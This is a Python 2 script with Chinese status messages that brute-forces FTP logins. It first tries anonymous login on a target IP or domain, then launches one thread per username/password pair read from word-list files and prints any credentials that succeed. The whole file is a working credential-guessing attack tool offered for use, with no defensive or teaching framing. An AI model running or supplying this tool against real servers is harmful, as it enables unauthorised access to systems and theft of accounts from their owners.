#! usr/bin/env python
#-*- coding: utf-8 -*-

import ftplib,sys
from threading import Thread
import time,re,socket

def brute_anony(host):
    try:
        print '[+]测试匿名登陆......\n'
        ftp = ftplib.FTP()
        ftp.connect(host,21,timeout=10)
        print 'FTP消息： %s \n' %ftp.getwelcome()
        ftp.login()
        ftp.retrlines('list')
        ftp.quit()
        print '\n[+] 匿名登陆成功......\n'
    except ftplib.all_errors:
        print '\n[-] 匿名登录失败......\n'
    finally:
        ftp.close()

def brute_users(host,user,pwd):
    try:
        #print '\n[+]破解中，用户名: %s 密码: %s\n' % (user,pwd)
        ftp = ftplib.FTP()
        ftp.connect(host,21,timeout=10)
        ftp.login(user,pwd)
        ftp.retrlines('list')
        ftp.quit()
        print '\n[+] 破解成功，用户名：%s 密码：%s' % (user,pwd)
    except ftplib.all_errors:
        pass
    finally:
        ftp.close()


if __name__ == '__main__':
    start_time = time.time()
    try:
        if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', sys.argv[1]):
            host = sys.argv[1]
        else:
            host = socket.gethostbyname(sys.argv[1])
    except:
        print '目标IP或域名未正确设置！'
        sys.exit(0)
    brute_anony(host)
    userlist = [i.rstrip() for i in open('username.txt')]
    passlist = [j.rstrip() for j in open ('password.txt')]
    print '\n[+] 暴力破解测试中......\n'
    print '目 标: %s \n' % host
    print '用户名: %d 条\n' % len(userlist)
    print '密码: %d 条\n' % len(passlist)
    thrdlist = []
    for user in userlist:
        for pwd in passlist:
            t = Thread(target=brute_users, args=(host,user,pwd))
            t.start()
            thrdlist.append(t)
            time.sleep(0.2)
    print '\n[+] 破解完成,用时: %d 秒' % (time.time() - start_time)